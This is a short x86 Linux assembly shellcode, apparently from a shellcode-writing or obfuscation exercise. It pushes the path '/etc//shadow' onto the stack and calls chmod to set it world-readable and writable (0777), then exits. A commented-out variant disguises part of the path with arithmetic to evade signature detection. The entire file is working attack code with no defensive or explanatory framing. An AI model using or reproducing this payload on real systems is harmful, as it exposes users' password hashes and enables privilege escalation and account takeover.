section .text
global _start

_start: 
    ; mov ebx, eax
    ; xor eax, ebx            ; = xor eax, eax
    xor eax, eax
    
    push dword eax

    ; ; push obfuscated "adow" string
    ; mov esi, 0x563a1f3e
    ; add esi, 0x21354523
    ; mov dword [esp-4], esi              ; "adow"
    ; mov dword [esp-8], 0x68732f2f       ; "hs//"
    ; mov dword [esp-12], 0x6374652f      ; "cte/"
    ; sub esp, 12
    push 0x776f6461         ; "woda"
    push 0x68732f2f         ; "hs//"
    push 0x6374652f         ; "cte/"

    mov ebx,esp
    
    push word  0x1ff ; permissions 0777
    pop cx

    mov al,0xf  ; chmod()
    int 0x80

    inc eax
    int 0x80
